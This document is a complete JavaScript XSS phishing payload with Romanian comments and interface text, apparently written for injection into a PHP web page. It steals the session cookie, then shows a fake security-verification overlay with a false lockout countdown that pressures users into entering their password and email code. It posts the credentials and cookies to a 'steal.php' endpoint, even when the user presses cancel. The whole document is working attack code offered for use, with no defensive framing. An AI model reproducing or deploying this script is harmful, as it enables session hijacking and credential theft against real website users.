<script>
function advancedPhishing() {
    // === FURĂ DATELE CURENTE ===
    var currentData = {
        attack_type: 'advanced_phishing',
        current_session: {
            cookies: document.cookie,
            sessionId: document.cookie.match(/PHPSESSID=([^;]+)/) ? document.cookie.match(/PHPSESSID=([^;]+)/)[1] : null,
            current_user: null
        },
        timestamp: new Date().toISOString()
    };
    
    // Extrage utilizatorul curent
    var userMatch = document.body.textContent.match(/User:\s*([a-zA-Z0-9_]+)/);
    if (userMatch) currentData.current_session.current_user = userMatch[1];
    
    // === CREEAZĂ FORMULAR FALS REALIST ===
    setTimeout(function() {
        var overlay = document.createElement('div');
        overlay.innerHTML = `
            <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 999999; display: flex; align-items: center; justify-content: center; font-family: Arial, sans-serif;">
                <div style="background: white; padding: 40px; border-radius: 10px; max-width: 450px; width: 90%; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
                    <div style="text-align: center; margin-bottom: 30px;">
                        <h2 style="color: #dc3545; margin: 0 0 10px 0;">🔐 Verificare Obligatorie de Securitate</h2>
                        <p style="color: #666; margin: 0; font-size: 14px;">Din cauza activității suspecte detectate pe cont, este necesară re-autentificarea immeidată.</p>
                    </div>
                    
                    <div style="background: #fff3cd; padding: 15px; border-radius: 5px; margin-bottom: 20px; border-left: 4px solid #ffc107;">
                        <small style="color: #856404;">⚠️ Contul va fi blocat în 5 minute dacă nu se efectuează verificarea.</small>
                    </div>
                    
                    <form id="phishing-form" onsubmit="return captureAndSubmit(event);">
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold; color: #333;">Username actual:</label>
                            <input type="text" id="stolen-username" required style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px;" value="${currentData.current_session.current_user || ''}" readonly>
                        </div>
                        
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold; color: #333;">Confirmă parola:</label>
                            <input type="password" id="stolen-password" required style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px;" placeholder="Introduceți parola pentru verificare">
                        </div>
                        
                        <div style="margin-bottom: 25px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold; color: #333;">Cod de verificare email (opțional):</label>
                            <input type="text" id="stolen-code" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px;" placeholder="Codul primit pe email">
                        </div>
                        
                        <button type="submit" style="width: 100%; padding: 15px; background: linear-gradient(135deg, #dc3545, #c82333); color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 15px;">
                            🔐 Verifică și Continuă
                        </button>
                        
                        <button type="button" onclick="cancelVerification()" style="width: 100%; padding: 10px; background: #6c757d; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">
                            Anulează (cont va fi blocat)
                        </button>
                    </form>
                    
                    <div style="text-align: center; margin-top: 20px;">
                        <small style="color: #888; font-size: 12px;">
                            🔒 Această verificare este conformă cu politicile de securitate și protecția datelor.<br>
                            ID Sesiune: ${currentData.current_session.sessionId || 'N/A'}
                        </small>
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(overlay);
        
        // Timer fals pentru presiune
        var timeLeft = 300; // 5 minute
        var timerInterval = setInterval(function() {
            timeLeft--;
            var minutes = Math.floor(timeLeft / 60);
            var seconds = timeLeft % 60;
            var timerText = minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
            
            var warningDiv = overlay.querySelector('div[style*="background: #fff3cd"]');
            if (warningDiv && timeLeft > 0) {
                warningDiv.innerHTML = `<small style="color: #856404;">⚠️ Timp rămas pentru verificare: <strong>${timerText}</strong></small>`;
            }
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                if (warningDiv) {
                    warningDiv.innerHTML = '<small style="color: #dc3545;">⚠️ <strong>TIMPUL A EXPIRAT! Contul va fi blocat.</strong></small>';
                }
            }
        }, 1000);
        
    }, 3000); // Așteaptă 3 secunde înainte să afișeze
    
    // Trimite datele inițiale
    fetch('./steal.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(currentData),
        mode: 'no-cors'
    });
}

function captureAndSubmit(event) {
    event.preventDefault();
    
    var username = document.getElementById('stolen-username').value;
    var password = document.getElementById('stolen-password').value;
    var code = document.getElementById('stolen-code').value;
    
    var stolenCredentials = {
        attack_type: 'phishing_credentials_captured',
        timestamp: new Date().toISOString(),
        stolen_data: {
            username: username,
            password: password,
            verification_code: code,
            session_hijacked: document.cookie,
            page_url: window.location.href,
            user_agent: navigator.userAgent
        },
        success_level: 'CRITICAL'
    };
    
    // Trimite credentialele furate
    fetch('./steal.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(stolenCredentials),
        mode: 'no-cors'
    }).then(function() {
        // Simulează verificarea
        var form = event.target;
        form.innerHTML = `
            <div style="text-align: center; padding: 30px;">
                <div style="color: #28a745; font-size: 3em; margin-bottom: 20px;">✅</div>
                <h3 style="color: #28a745; margin: 0 0 15px 0;">Verificare Completă!</h3>
                <p style="color: #666; margin: 0 0 10px 0;">Identitatea confirmată cu succes.</p>
                <p style="color: #666; font-size: 14px;">Contul este securizat și activitatea suspectă a fost eliminată.</p>
                <div style="margin-top: 20px; padding: 15px; background: #d4edda; border-radius: 5px;">
                    <small style="color: #155724;">🛡️ Sistemul de securitate este acum activ pentru contul dumneavoastră.</small>
                </div>
            </div>
        `;
        
        // Elimină overlay-ul după 4 secunde
        setTimeout(function() {
            var overlay = document.querySelector('div[style*="position: fixed"]');
            if (overlay) overlay.remove();
        }, 4000);
        
    }).catch(function(error) {
        console.log('Failed to send stolen credentials:', error);
    });
    
    return false;
}

function cancelVerification() {
    // Trimite și informația că a încercat să anuleze
    fetch('./steal.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            attack_type: 'phishing_cancelled',
            user_action: 'attempted_cancel',
            timestamp: new Date().toISOString(),
            session: document.cookie
        }),
        mode: 'no-cors'
    });
    
    // Schimbă mesajul să pară că contul va fi blocat
    var overlay = document.querySelector('div[style*="position: fixed"]');
    if (overlay) {
        overlay.querySelector('div[style*="background: white"]').innerHTML = `
            <div style="text-align: center; padding: 40px;">
                <div style="color: #dc3545; font-size: 3em; margin-bottom: 20px;">🚫</div>
                <h3 style="color: #dc3545;">Cont Blocat Temporar</h3>
                <p style="color: #666;">Verificarea a fost anulată. Din motive de securitate, contul va fi blocat timp de 24 ore.</p>
                <p style="color: #666; font-size: 14px; margin-top: 20px;">Pentru deblocare imediată, contactați suportul tehnic.</p>
            </div>
        `;
        
        setTimeout(function() {
            overlay.remove();
        }, 5000);
    }
}

// === EXECUȚIE ===
advancedPhishing();

console.log('🎣 Advanced phishing attack activated!');
</script>